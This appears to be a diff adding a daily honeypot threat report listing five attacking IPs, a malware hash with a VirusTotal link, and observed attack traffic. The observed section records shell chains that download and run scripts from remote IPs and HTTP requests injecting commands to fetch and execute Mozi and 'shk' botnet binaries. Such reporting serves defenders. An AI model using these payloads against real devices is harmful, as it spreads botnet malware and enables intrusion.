@@ -1,0 +1,26 @@
+Top 5 IPs for 2024-04-30 :
+
+123.202.133.10
+179.43.180.108
+154.212.141.156
+221.149.51.164
+125.135.65.237
+
+Malware Download:
+
+d9cd6dfca94282619431285858508adf7a4552a70c2bb6dc4f30b0c83d9b1615
+https://www.virustotal.com/gui/file/d9cd6dfca94282619431285858508adf7a4552a70c2bb6dc4f30b0c83d9b1615
+
+
+Commands/exploits observed:
+
+cd /data/local/tmp/; busybox wget http://185.196.11.177/w.sh; sh w.sh; curl http://1185.196.11.177/c.sh; sh c.sh; wget http://103.161.181.160/wget.sh; sh wget.sh; curl http://185.196.11.177/wget.sh; sh wget.sh; busybox wget http://185.196.11.177/wget.sh; sh wget.sh; busybox curl http://185.196.11.177/wget.sh; sh wget.sh
+
+
+
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.204.202.105:36381/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0
+
+GET /shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/179.43.190.218/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk HTTP/1.1
+Host: HOST-IP
+User-Agent: Root Slut
+
